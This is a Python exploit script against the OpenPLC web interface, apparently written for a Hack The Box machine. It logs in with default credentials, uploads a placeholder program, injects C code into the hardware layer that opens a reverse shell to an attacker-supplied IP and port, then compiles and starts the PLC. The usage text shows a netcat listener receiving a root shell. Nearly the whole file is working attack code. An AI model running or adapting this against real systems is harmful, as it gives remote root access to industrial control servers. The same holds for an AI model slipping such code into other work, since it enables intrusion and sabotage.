#!/usr/bin/env python3


import requests
import argparse
import textwrap
from io import BytesIO
from time import sleep
from bs4 import BeautifulSoup


session = requests.Session()


def show_usage():
    print("==== Basic usage ====")
    print("TERMINAL_1 > nc -lvnp 6969")
    print("TERMINAL_1 > listening on [any] 6969 ...")
    print("")
    print("TERMINAL_2 > openplc_exploit.py --ip 10.10.14.50 --port 6969 --target http://wifinetictwo.htb:8080/ -U openplc -P openplc")
    print("TERMINAL_2 > ... SNIP ...")
    print("")
    print("TERMINAL_1 > nc -lvnp 6969")
    print("TERMINAL_1 > listening on [any] 6969 ...")    
    print("TERMINAL_1 > connect to [10.10.14.50] from (UNKNOWN) [10.10.11.7] 52592")
    print("TERMINAL_1 > whoami")
    print("TERMINAL_1 > root")
    print("======================")
    exit(0)


def parse_args():

    arguments = argparse.ArgumentParser()

    arguments.add_argument(
        "--usage",
        help="show usage message",
        action="store_true"
    )

    arguments.add_argument(
        "--ip",
        help="ip address for the reverse connection",
        metavar="ADDR",
        required=True
    )

    arguments.add_argument(
        "--port",
        help="port number to the reverse connection",
        metavar="PORT",
        type=int,
        required=True
    )

    arguments.add_argument(
        "--target",
        help="target url. Example: http://localhost:8080",
        metavar="URL",
        required=True
    )

    arguments.add_argument(
        "-U",
        "--username",
        help="username to log int to openplc web server",
        metavar="USER",
        required=True
    )

    arguments.add_argument(
        "-P",
        "--password",
        help="password to log in to openplc web server",
        required=True
    )

    arguments.add_argument(
        "--payload-program",
        help="structured text openplc format to send to /upload-program",
        default=textwrap.dedent("""
        PROGRAM NoOperation
          VAR
            unused_var: BOOL;
          END_VAR
          unused_var:=FALSE;
        END_PROGRAM
        CONFIGURATION Config0
          RESOURCE Res0 ON PLC
            TASK IdleTask(INTERVAL := T#100ms, PRIORITY := 1);
            PROGRAM IdleInstance WITH IdleTask : NoOperation;
          END_RESOURCE
        END_CONFIGURATION
        """)
    )

    args = arguments.parse_args()

    arguments.add_argument(
        "--payload-hardware",
        help="C code to send to /hardware, change at your own risk.",
        default=textwrap.dedent("""
        #include "ladder.h"
        #include <stdio.h>
        #include <sys/socket.h>
        #include <sys/types.h>
        #include <stdlib.h>
        #include <unistd.h>
        #include <netinet/in.h>
        #include <arpa/inet.h>

        int ignored_bool_inputs[] = {-1};
        int ignored_bool_outputs[] = {-1};
        int ignored_int_inputs[] = {-1};
        int ignored_int_outputs[] = {-1};

        void initCustomLayer(){}

        void updateCustomIn(){}

        void updateCustomOut()
        {
            int port = %s;
            struct sockaddr_in revsockaddr;

            int sockt = socket(AF_INET, SOCK_STREAM, 0);
            revsockaddr.sin_family = AF_INET;       
            revsockaddr.sin_port = htons(port);
            revsockaddr.sin_addr.s_addr = inet_addr("%s");

            connect(sockt, (struct sockaddr *) &revsockaddr, 
            sizeof(revsockaddr));
            dup2(sockt, 0);
            dup2(sockt, 1);
            dup2(sockt, 2);

            char * const argv[] = {"sh", NULL};
            execvp("sh", argv);

            return 0;       
        }
        """ %(args.port, args.ip))
    )

    return arguments.parse_args()
    
    
def login(target:str, username="openplc", password="openplc"):
    """login tries to login to /login using specified credentials to get a session cookie.

    If fail to log in, exit with status code 1.

    Args:
        target (str): url of the target. Example: http://localhost:8080/login
        username (str, optional): username to use in the login.
        password (str, optional): password to use in the login.
    """
    global session

    post_data = {
        "username":username,
        "password":password
    }

    print(f"[!] Trying to log in with credentials {username}:{password}")
    
    try:
        response = session.post(
            url=target,
            data=post_data,
            #proxies={"http":"http://localhost:8080"}
        )
    except:
        print(f"[X] Error while trying to login to {target}")
        exit(1)

    if response.ok:
        try:
            session_cookie = session.cookies.get('session')
        except:
            print("[X] Login failed. No session cookie obtained")
            exit(1)

        print("[!] Successful login")
        print(f"[!] Session Cookie: session={session_cookie}")
    else:
        print(f"[X] Login failed. Status code: {response.status_code}")
        exit(1)


def upload_program(target:str, payload:str):
    """upload_program uploads an openplc structured text program to /upload-program
    
    Args:
        target (str): url of the target. Example: http://target:8080/upload-program
        payload (str): openplc structure text source code.
    """
    global session

    request_data = {
        "file":("code.st",payload),
        "submit":(None, "Upload Program")
    }

    print(f"[!] Sending payload to: {target}")

    try:
        response = session.post(
            target,
            files=request_data,
            #proxies={"http":"http://localhost:8080"}
        )
    except:
        print(f"[X] Error, unable to send post request while uploading program to {target}.")
        exit(1)


    soup = BeautifulSoup(response.text, 'html.parser')
    prog_file = soup.find('input', {'id':'prog_file'}).get('value')
    epoch_time = soup.find('input', {'id':'epoch_time'}).get('value')

    target += "/../upload-program-action"

    request_data = {
        "prog_name":(None, "pwn"),
        "prog_descr":(None, ""),
        "prog_file":(None, prog_file),
        "epoch_time":(None, epoch_time)
    }

    try:
        response = session.post(
            target,
            files=request_data,
            #proxies={"http":"http://localhost:8080"}
        )
    except:
        print(f"[X] Error, unable to send post request while uploading program to {target}.")
        exit(0)    

    return prog_file


def upload_hardware_code(target:str, payload:str):
    """upload a c source code to /hardware using blank_linux template. 
    This code is important cause it specifies the instruction to the reverse connection.
    
    Args:
        target (str): url of the target. Example: http://target:8080/hardware
        payload (str): C source code to connect back to our machine.
    """
    global session

    request_data = {
        "hardware_layer":(None,"blank_linux"),
        "custom_layer_code":(None, payload)
    }

    print(f"[!] Sending payload to: {target} ")

    try:
        response = session.post(
            target,
            files=request_data,
            # proxies={"http":"http://localhost:8080"}
        )   
    except:
        print("[X] Error, unable to send post request while sendind payload.")
        exit(0)



def compile_program(target:str):
    """Compile the openplc structured text program.
    
    Args:
        target (str): url of the target. Example: http://target:8080/compile-program?file=1234.st
    """
    global session

    print(f"[!] Program compilation in curse. {target}")

    try:
        response = session.get(
            target
        )   
    except:
        print("[X] Error, unable to compile program...")
        exit(1)

    if response.ok:
        sleep(10)
        print("[!] Program compiled successfully...")
    else:
        print(f"[X] Error while compiling program. status code {response.status_code}")
        exit(1)


def start_plc(target:str):
    """Start the compiled program, this will make the c program in /hardware to be executed.
    
    Args:
        target (str): url of the target. Example: http://target:8080/start_plc
    """
    global session

    print("[!] Starting plc. Check your listener...")

    try:
        response = session.get(
            target
        )   
    except:
        print("[X] Error while starting plc...")
        exit(1)

    if response.ok:
        print("[!] PLC Started successfully.")
    else:
        print("[X] Failed to start PLC...")
        exit(1)


def main():
    global session

    args = parse_args()

    if args.usage:
        show_usage()

    print("=======================")
    print(f"[1]      Target: {args.target}")
    print(f"[2] Credentials: {args.username}:{args.password}")
    print(f"[3] Addr for rev shell: {args.ip}:{args.port}")
    print("=======================\n\n")
    
    login(
        args.target + "/login",
        args.username,
        args.password
    )

    prog_file = upload_program(
        args.target + "/upload-program",
        args.payload_program
    )
    
    upload_hardware_code(
        args.target + "/hardware",
        args.payload_hardware
    )

    compile_program(
        args.target + f"compile-program?file={prog_file}"
    )

    start_plc(
        args.target + "/start_plc"
    )

    

if __name__ == "__main__":
    main()

